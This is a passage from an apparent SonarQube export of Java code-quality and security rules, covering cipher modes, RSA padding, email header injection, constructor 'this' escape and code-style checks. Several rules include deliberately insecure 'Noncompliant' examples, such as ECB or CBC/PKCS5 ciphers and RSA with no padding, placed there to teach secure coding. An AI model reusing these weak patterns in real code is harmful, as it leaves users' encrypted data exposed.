            "debtRemFnCoeff": "1min",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "LINEAR_OFFSET",
            "defaultRemFnGapMultiplier": "1min",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "LINEAR_OFFSET",
            "remFnGapMultiplier": "1min",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "gapDescription": "per complexity point above the threshold",
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5542",
            "repo": "java",
            "name": "Encryption algorithms should be used with secure mode and padding scheme",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>To perform secure cryptography, operation modes and padding scheme are essentials and should be used correctly according to the encryption\nalgorithm:</p>\n<ul>\n  <li> For block cipher encryption algorithms (like AES), the GCM (Galois Counter Mode) mode that <a\n  href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode#Mathematical_basis\">works internally</a> with zero/no padding scheme, is recommended. At the\n  opposite, these modes and/or schemes are highly discouraged:\n    <ul>\n      <li> Electronic Codebook (ECB) mode is vulnerable because it doesn't provide serious message confidentiality: under a given key any given\n      plaintext block always gets encrypted to the same ciphertext block. </li>\n      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is vulnerable to padding oracle attacks. </li>\n    </ul> </li>\n  <li> RSA encryption algorithm should be used with the recommended padding scheme (OAEP) </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nCipher c0 = Cipher.getInstance(\"AES\"); // Noncompliant: by default ECB mode is chosen\nCipher c1 = Cipher.getInstance(\"AES/ECB/NoPadding\"); // Noncompliant: ECB doesn't provide serious message confidentiality\nCipher c3 = Cipher.getInstance(\"Blowfish/ECB/PKCS5Padding\"); // Noncompliant: ECB doesn't provide serious message confidentiality\nCipher c4 = Cipher.getInstance(\"DES/ECB/PKCS5Padding\"); // Noncompliant: ECB doesn't provide serious message confidentiality\n\nCipher c6 = Cipher.getInstance(\"AES/CBC/PKCS5Padding\"); // Noncompliant: CBC with PKCS5 is vulnerable to oracle padding attacks\nCipher c7 = Cipher.getInstance(\"Blowfish/CBC/PKCS5Padding\"); // Noncompliant: CBC with PKCS5 is vulnerable to oracle padding attacks\nCipher c8 = Cipher.getInstance(\"DES/CBC/PKCS5Padding\"); // Noncompliant: CBC with PKCS5 is vulnerable to oracle padding attacks\nCipher c9 = Cipher.getInstance(\"AES/CBC/PKCS7Padding\"); // Noncompliant: CBC with PKCS7 is vulnerable to oracle padding attacks\nCipher c10 = Cipher.getInstance(\"Blowfish/CBC/PKCS7Padding\"); // Noncompliant: CBC with PKCS7 is vulnerable to oracle padding attacks\nCipher c11 = Cipher.getInstance(\"DES/CBC/PKCS7Padding\"); // Noncompliant: CBC with PKCS7 is vulnerable to oracle padding attacks\n\nCipher c14 = Cipher.getInstance(\"RSA/NONE/NoPadding\"); // Noncompliant: RSA without OAEP padding scheme is not recommanded\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// Recommended for block ciphers\nCipher c5 = Cipher.getInstance(\"AES/GCM/NoPadding\"); // Compliant\n\n// Recommended for RSA\nCipher c15 = Cipher.getInstance(\"RSA/None/OAEPWithSHA-1AndMGF1Padding\"); // Compliant\nCipher c16 = Cipher.getInstance(\"RSA/None/OAEPWITHSHA-256ANDMGF1PADDING\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "mdDesc": "<p>To perform secure cryptography, operation modes and padding scheme are essentials and should be used correctly according to the encryption\nalgorithm:</p>\n<ul>\n  <li> For block cipher encryption algorithms (like AES), the GCM (Galois Counter Mode) mode that <a\n  href=\"https://en.wikipedia.org/wiki/Galois/Counter_Mode#Mathematical_basis\">works internally</a> with zero/no padding scheme, is recommended. At the\n  opposite, these modes and/or schemes are highly discouraged:\n    <ul>\n      <li> Electronic Codebook (ECB) mode is vulnerable because it doesn't provide serious message confidentiality: under a given key any given\n      plaintext block always gets encrypted to the same ciphertext block. </li>\n      <li> Cipher Block Chaining (CBC) with PKCS#5 padding (or PKCS#7) is vulnerable to padding oracle attacks. </li>\n    </ul> </li>\n  <li> RSA encryption algorithm should be used with the recommended padding scheme (OAEP) </li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n<pre>\nCipher c0 = Cipher.getInstance(\"AES\"); // Noncompliant: by default ECB mode is chosen\nCipher c1 = Cipher.getInstance(\"AES/ECB/NoPadding\"); // Noncompliant: ECB doesn't provide serious message confidentiality\nCipher c3 = Cipher.getInstance(\"Blowfish/ECB/PKCS5Padding\"); // Noncompliant: ECB doesn't provide serious message confidentiality\nCipher c4 = Cipher.getInstance(\"DES/ECB/PKCS5Padding\"); // Noncompliant: ECB doesn't provide serious message confidentiality\n\nCipher c6 = Cipher.getInstance(\"AES/CBC/PKCS5Padding\"); // Noncompliant: CBC with PKCS5 is vulnerable to oracle padding attacks\nCipher c7 = Cipher.getInstance(\"Blowfish/CBC/PKCS5Padding\"); // Noncompliant: CBC with PKCS5 is vulnerable to oracle padding attacks\nCipher c8 = Cipher.getInstance(\"DES/CBC/PKCS5Padding\"); // Noncompliant: CBC with PKCS5 is vulnerable to oracle padding attacks\nCipher c9 = Cipher.getInstance(\"AES/CBC/PKCS7Padding\"); // Noncompliant: CBC with PKCS7 is vulnerable to oracle padding attacks\nCipher c10 = Cipher.getInstance(\"Blowfish/CBC/PKCS7Padding\"); // Noncompliant: CBC with PKCS7 is vulnerable to oracle padding attacks\nCipher c11 = Cipher.getInstance(\"DES/CBC/PKCS7Padding\"); // Noncompliant: CBC with PKCS7 is vulnerable to oracle padding attacks\n\nCipher c14 = Cipher.getInstance(\"RSA/NONE/NoPadding\"); // Noncompliant: RSA without OAEP padding scheme is not recommanded\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n// Recommended for block ciphers\nCipher c5 = Cipher.getInstance(\"AES/GCM/NoPadding\"); // Compliant\n\n// Recommended for RSA\nCipher c15 = Cipher.getInstance(\"RSA/None/OAEPWithSHA-1AndMGF1Padding\"); // Compliant\nCipher c16 = Cipher.getInstance(\"RSA/None/OAEPWITHSHA-256ANDMGF1PADDING\"); // Compliant\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/hDdGBQ\">CERT, MSC61-J.</a> - Do not use insecure or weak cryptographic algorithms </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n</ul>",
            "severity": "BLOCKER",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "cwe",
                "owasp-a3",
                "owasp-a6",
                "privacy",
                "sans-top25-porous"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "VULNERABILITY"
        },
        {
            "key": "java:S1188",
            "repo": "java",
            "name": "Anonymous classes should not have too many lines",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Anonymous classes are a very convenient and compact way to inject a behavior without having to create a dedicated class. But those anonymous inner\nclasses should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly become\nunreadable.</p>",
            "mdDesc": "<p>Anonymous classes are a very convenient and compact way to inject a behavior without having to create a dedicated class. But those anonymous inner\nclasses should be used only if the behavior to be injected can be defined in a few lines of code, otherwise the source code can quickly become\nunreadable.</p>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [
                {
                    "key": "Max",
                    "htmlDesc": "Maximum allowed lines in an anonymous class",
                    "defaultValue": "20",
                    "type": "INTEGER"
                }
            ],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "20min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "20min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "20min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "20min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5300",
            "repo": "java",
            "name": "Sending emails is security-sensitive",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Sending emails is security-sensitive and can expose an application to a large range of vulnerabilities.</p>\n<p><strong>Information Exposure</strong></p>\n<p>Emails often contain sensitive information which might be exposed to an attacker if he can add an arbitrary address to the recipient list.</p>\n<p><strong>Spamming / Phishing</strong></p>\n<p>Malicious user can abuse email based feature to send spam or phishing content.</p>\n<p><strong>Dangerous Content Injection</strong></p>\n<p>Emails can contain HTML and JavaScript code, thus they can be used for XSS attacks.</p>\n<p><strong>Email Headers Injection</strong></p>\n<p>Email fields such as <code>subject</code>, <code>to</code>, <code>cc</code>, <code>bcc</code>, <code>from</code> are set in email \"headers\".&nbsp;\nUsing unvalidated user input to set those fields&nbsp;might allow attackers to inject new line characters in headers to craft malformed SMTP requests.\nAlthough modern libraries are filtering new line character by default, user data used in&nbsp;email \"headers\" should always be validated.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9801\">CVE-2017-9801</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4803\">CVE-2016-4803</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Unvalidated user input are used to set email headers. </li>\n  <li> Email content contains data provided by users and it is not sanitized. </li>\n  <li> Email recipient list or body are based user inputs. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use an email library which sanitizes headers (java.mail &gt;= 1.5.6). </li>\n  <li> Use html escape functions to sanitize every piece of data used to in the email body. </li>\n  <li> Verify application logic to make sure that email base feature can not be abuse to:\n    <ul>\n      <li> Send arbitrary email for spamming or fishing </li>\n      <li> Disclose sensitive email content </li>\n    </ul> </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport javax.mail.*;\nimport javax.mail.internet.MimeMessage;\n\npublic class Main {\n    public static void sendEmail (Session session, String subject) throws MessagingException{\n        Message message = new MimeMessage(session);  // Sensitive\n\n        // For example the setSubject method is vulnerable to Header injection before\n        // version 1.5.6 of javamail\n        message.setSubject(subject);\n        // ...\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.damonkohler.com/2008/12/email-injection.html\">Email Injection</a> </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/93.html\">MITRE, CWE-93</a> - Improper Neutralization of CRLF Sequences ('CRLF Injection') </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/80.html\">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page\n  (Basic XSS) </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "mdDesc": "<p>Sending emails is security-sensitive and can expose an application to a large range of vulnerabilities.</p>\n<p><strong>Information Exposure</strong></p>\n<p>Emails often contain sensitive information which might be exposed to an attacker if he can add an arbitrary address to the recipient list.</p>\n<p><strong>Spamming / Phishing</strong></p>\n<p>Malicious user can abuse email based feature to send spam or phishing content.</p>\n<p><strong>Dangerous Content Injection</strong></p>\n<p>Emails can contain HTML and JavaScript code, thus they can be used for XSS attacks.</p>\n<p><strong>Email Headers Injection</strong></p>\n<p>Email fields such as <code>subject</code>, <code>to</code>, <code>cc</code>, <code>bcc</code>, <code>from</code> are set in email \"headers\".&nbsp;\nUsing unvalidated user input to set those fields&nbsp;might allow attackers to inject new line characters in headers to craft malformed SMTP requests.\nAlthough modern libraries are filtering new line character by default, user data used in&nbsp;email \"headers\" should always be validated.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9801\">CVE-2017-9801</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4803\">CVE-2016-4803</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Unvalidated user input are used to set email headers. </li>\n  <li> Email content contains data provided by users and it is not sanitized. </li>\n  <li> Email recipient list or body are based user inputs. </li>\n</ul>\n<p>You are at risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Use an email library which sanitizes headers (java.mail &gt;= 1.5.6). </li>\n  <li> Use html escape functions to sanitize every piece of data used to in the email body. </li>\n  <li> Verify application logic to make sure that email base feature can not be abuse to:\n    <ul>\n      <li> Send arbitrary email for spamming or fishing </li>\n      <li> Disclose sensitive email content </li>\n    </ul> </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nimport javax.mail.*;\nimport javax.mail.internet.MimeMessage;\n\npublic class Main {\n    public static void sendEmail (Session session, String subject) throws MessagingException{\n        Message message = new MimeMessage(session);  // Sensitive\n\n        // For example the setSubject method is vulnerable to Header injection before\n        // version 1.5.6 of javamail\n        message.setSubject(subject);\n        // ...\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.damonkohler.com/2008/12/email-injection.html\">Email Injection</a> </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A1-Injection\">OWASP Top 10 2017 Category A1</a> - Injection </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/93.html\">MITRE, CWE-93</a> - Improper Neutralization of CRLF Sequences ('CRLF Injection') </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/80.html\">MITRE, CWE-80</a> - Improper Neutralization of Script-Related HTML Tags in a Web Page\n  (Basic XSS) </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat1\">SANS Top 25</a> - Insecure Interaction Between Components </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated, and will eventually be removed.</p>",
            "severity": "CRITICAL",
            "status": "DEPRECATED",
            "isTemplate": false,
            "tags": [],
            "sysTags": [],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "SECURITY_HOTSPOT"
        },
        {
            "key": "java:S3366",
            "repo": "java",
            "name": "\"this\" should not be exposed from constructors",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>In single-threaded environments, the use of <code>this</code> in constructors is normal, and expected. But in multi-threaded environments, it could\nexpose partially-constructed objects to other threads, and should be used with caution.</p>\n<p>The classic example is a class with a <code>static</code> list of its instances. If the constructor stores <code>this</code> in the list, another\nthread could access the object before it's fully-formed. Even when the storage of <code>this</code> is the last instruction in the constructor,\nthere's still a danger if the class is not <code>final</code>. In that case, the initialization of subclasses won't be complete before\n<code>this</code> is exposed.</p>\n<p>This rule raises an issue when <code>this</code> is assigned to any globally-visible object in a constructor, and when it is passed to the method\nof another object in a constructor</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Monument {\n\n  public static final List&lt;Monument&gt; ALL_MONUMENTS = new ArrayList()&lt;&gt;;\n  // ...\n\n  public Monument(String location, ...) {\n    ALL_MONUMENTS.add(this);  // Noncompliant; passed to a method of another object\n\n    this.location = location;\n    // ...\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule ignores instances of assigning <code>this</code> directly to a <code>static</code> field of the same class because that case is covered\nby <a href='/coding_rules#rule_key=java%3AS3010'>S3010</a>.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/iDdGBQ\">CERT, TSM01-J.</a> - Do not let the this reference escape during object construction\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/vzdGBQ\">CERT, TSM03-J.</a> - Do not publish partially initialized objects </li>\n</ul>",
            "mdDesc": "<p>In single-threaded environments, the use of <code>this</code> in constructors is normal, and expected. But in multi-threaded environments, it could\nexpose partially-constructed objects to other threads, and should be used with caution.</p>\n<p>The classic example is a class with a <code>static</code> list of its instances. If the constructor stores <code>this</code> in the list, another\nthread could access the object before it's fully-formed. Even when the storage of <code>this</code> is the last instruction in the constructor,\nthere's still a danger if the class is not <code>final</code>. In that case, the initialization of subclasses won't be complete before\n<code>this</code> is exposed.</p>\n<p>This rule raises an issue when <code>this</code> is assigned to any globally-visible object in a constructor, and when it is passed to the method\nof another object in a constructor</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Monument {\n\n  public static final List&lt;Monument&gt; ALL_MONUMENTS = new ArrayList()&lt;&gt;;\n  // ...\n\n  public Monument(String location, ...) {\n    ALL_MONUMENTS.add(this);  // Noncompliant; passed to a method of another object\n\n    this.location = location;\n    // ...\n  }\n}\n</pre>\n<h2>Exceptions</h2>\n<p>This rule ignores instances of assigning <code>this</code> directly to a <code>static</code> field of the same class because that case is covered\nby {rule:java:S3010}.</p>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/iDdGBQ\">CERT, TSM01-J.</a> - Do not let the this reference escape during object construction\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/vzdGBQ\">CERT, TSM03-J.</a> - Do not publish partially initialized objects </li>\n</ul>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "cert",
                "multi-threading",
                "suspicious"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "30min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "30min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "30min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "30min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S5783",
            "repo": "java",
            "name": "Only one method invocation is expected when testing checked exceptions",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>When verifying that code raises an exception, a good practice is to avoid having multiple method calls inside the tested code, to be explicit about\nwhat is exactly tested.</p>\n<p>When two of the methods can raise the same <strong>checked</strong> exception, not respecting this good practice is a bug, since it is not possible\nto know what is really tested.</p>\n<p>You should make sure that only one method can raise the expected checked exception in the tested code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testG() {\n  // Do you expect g() or f() throwing the exception?\n  assertThrows(IOException.class, () -&gt; g(f(1)) ); // Noncompliant\n}\n\n@Test\npublic void testGTryCatchIdiom() {\n  try { // Noncompliant\n    g(f(1));\n    Assert.fail(\"Expected an IOException to be thrown\");\n  } catch (IOException e) {\n    // Test exception message...\n  }\n}\n\nint f(int x) throws IOException {\n  // ...\n}\n\nint g(int x) throws IOException {\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testG() {\n  int y = f(1);\n  // It is explicit that we expect an exception from g() and not f()\n  assertThrows(IOException.class, () -&gt; g(y) );\n}\n\n@Test\npublic void testGTryCatchIdiom() {\n  int y = f(1);\n  try {\n    g(y);\n    Assert.fail(\"Expected an IOException to be thrown\");\n  } catch (IOException e) {\n    // Test exception message...\n  }\n}\n</pre>",
            "mdDesc": "<p>When verifying that code raises an exception, a good practice is to avoid having multiple method calls inside the tested code, to be explicit about\nwhat is exactly tested.</p>\n<p>When two of the methods can raise the same <strong>checked</strong> exception, not respecting this good practice is a bug, since it is not possible\nto know what is really tested.</p>\n<p>You should make sure that only one method can raise the expected checked exception in the tested code.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\n@Test\npublic void testG() {\n  // Do you expect g() or f() throwing the exception?\n  assertThrows(IOException.class, () -&gt; g(f(1)) ); // Noncompliant\n}\n\n@Test\npublic void testGTryCatchIdiom() {\n  try { // Noncompliant\n    g(f(1));\n    Assert.fail(\"Expected an IOException to be thrown\");\n  } catch (IOException e) {\n    // Test exception message...\n  }\n}\n\nint f(int x) throws IOException {\n  // ...\n}\n\nint g(int x) throws IOException {\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@Test\npublic void testG() {\n  int y = f(1);\n  // It is explicit that we expect an exception from g() and not f()\n  assertThrows(IOException.class, () -&gt; g(y) );\n}\n\n@Test\npublic void testGTryCatchIdiom() {\n  int y = f(1);\n  try {\n    g(y);\n    Assert.fail(\"Expected an IOException to be thrown\");\n  } catch (IOException e) {\n    // Test exception message...\n  }\n}\n</pre>",
            "severity": "CRITICAL",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "junit",
                "tests"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "debtOverloaded": false,
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "BUG"
        },
        {
            "key": "java:S1066",
            "repo": "java",
            "name": "Collapsible \"if\" statements should be merged",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (file != null) {\n  if (file.isFile() || file.isDirectory()) {\n    /* ... */\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (file != null &amp;&amp; isFileOrDirectory(file)) {\n  /* ... */\n}\n\nprivate static boolean isFileOrDirectory(File file) {\n  return file.isFile() || file.isDirectory();\n}\n</pre>",
            "mdDesc": "<p>Merging collapsible <code>if</code> statements increases the code's readability.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (file != null) {\n  if (file.isFile() || file.isDirectory()) {\n    /* ... */\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nif (file != null &amp;&amp; isFileOrDirectory(file)) {\n  /* ... */\n}\n\nprivate static boolean isFileOrDirectory(File file) {\n  return file.isFile() || file.isDirectory();\n}\n</pre>",
            "severity": "MAJOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "clumsy"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2156",
            "repo": "java",
            "name": "\"final\" classes should not have \"protected\" members",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code>\nmembers, but they cannot see <code>private</code> ones. Since a <code>final</code> class will have no children, marking the members of a\n<code>final</code> class <code>protected</code> is confusingly pointless.</p>\n<p>Note that the <code>protected</code> members of a class can also be seen and used by other classes that are placed within the same package, this\ncould lead to accidental, unintended access to otherwise private members.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic final class MyFinalClass {\n\n  protected String name = \"Fred\";  // Noncompliant\n  protected void setName(String name) {  // Noncompliant\n    // ...\n  }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic final class MyFinalClass {\n\n  private String name = \"Fred\";\n  public void setName(String name) {\n    // ...\n  }\n</pre>\n<h2>Exceptions</h2>\n<p>Members annotated with Guava's <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed\nto make the code testable.</p>\n<pre>\npublic final class MyFinalClass {\n  @VisibleForTesting\n  protected Logger logger; // Compliant\n\n  @VisibleForTesting\n  protected int calculateSomethingComplex(String input) { // Compliant\n    // ...\n  }\n}\n</pre>",
            "mdDesc": "<p>The difference between <code>private</code> and <code>protected</code> visibility is that child classes can see and use <code>protected</code>\nmembers, but they cannot see <code>private</code> ones. Since a <code>final</code> class will have no children, marking the members of a\n<code>final</code> class <code>protected</code> is confusingly pointless.</p>\n<p>Note that the <code>protected</code> members of a class can also be seen and used by other classes that are placed within the same package, this\ncould lead to accidental, unintended access to otherwise private members.</p>\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic final class MyFinalClass {\n\n  protected String name = \"Fred\";  // Noncompliant\n  protected void setName(String name) {  // Noncompliant\n    // ...\n  }\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\npublic final class MyFinalClass {\n\n  private String name = \"Fred\";\n  public void setName(String name) {\n    // ...\n  }\n</pre>\n<h2>Exceptions</h2>\n<p>Members annotated with Guava's <code>@VisibleForTesting</code> annotation are ignored, as it indicates that visibility has been purposely relaxed\nto make the code testable.</p>\n<pre>\npublic final class MyFinalClass {\n  @VisibleForTesting\n  protected Logger logger; // Compliant\n\n  @VisibleForTesting\n  protected int calculateSomethingComplex(String input) { // Compliant\n    // ...\n  }\n}\n</pre>",
            "severity": "MINOR",
            "status": "READY",
            "isTemplate": false,
            "tags": [],
            "sysTags": [
                "confusing"
            ],
            "lang": "java",
            "langName": "Java",
            "params": [],
            "defaultDebtRemFnType": "CONSTANT_ISSUE",
            "defaultDebtRemFnOffset": "5min",
            "debtOverloaded": false,
            "debtRemFnType": "CONSTANT_ISSUE",
            "debtRemFnOffset": "5min",
            "defaultRemFnType": "CONSTANT_ISSUE",
            "defaultRemFnBaseEffort": "5min",
            "remFnType": "CONSTANT_ISSUE",
            "remFnBaseEffort": "5min",
            "remFnOverloaded": false,
            "scope": "MAIN",
            "isExternal": false,
            "type": "CODE_SMELL"
        },
        {
            "key": "java:S2277",
            "repo": "java",
            "name": "Cryptographic RSA algorithms should always incorporate OAEP (Optimal Asymmetric Encryption Padding)",
            "createdAt": "2022-09-26T07:32:37+0000",
            "htmlDesc": "<p>Without OAEP in RSA encryption, it takes less work for an attacker to decrypt the data or infer patterns from the ciphertext. This rule logs an\nissue as soon as a literal value starts with <code>RSA/NONE</code>. </p>\n<h2>Noncompliant Code Example</h2>\n<pre>\nCipher rsa = javax.crypto.Cipher.getInstance(\"RSA/NONE/NoPadding\");\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCipher rsa = javax.crypto.Cipher.getInstance(\"RSA/ECB/OAEPWITHSHA-256ANDMGF1PADDING\");\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure\">OWASP Top 10 2017 Category A3</a> - Sensitive Data Exposure\n  </li>\n  <li> <a href=\"https://www.owasp.org/index.php/Top_10-2017_A6-Security_Misconfiguration\">OWASP Top 10 2017 Category A6</a> - Security\n  Misconfiguration </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/780.html\">MITRE CWE-780</a> - Use of RSA Algorithm without OAEP </li>\n  <li> <a href=\"https://cwe.mitre.org/data/definitions/327.html\">MITRE CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm </li>\n  <li> <a href=\"https://www.sans.org/top25-software-errors/#cat3\">SANS Top 25</a> - Porous Defenses </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#RSA_NO_PADDING\">RSA NoPadding Unsafe</a> </li>\n</ul>\n<h2>Deprecated</h2>\n<p>This rule is deprecated; use <a href='/coding_rules#rule_key=java%3AS5542'>S5542</a> instead.</p>",
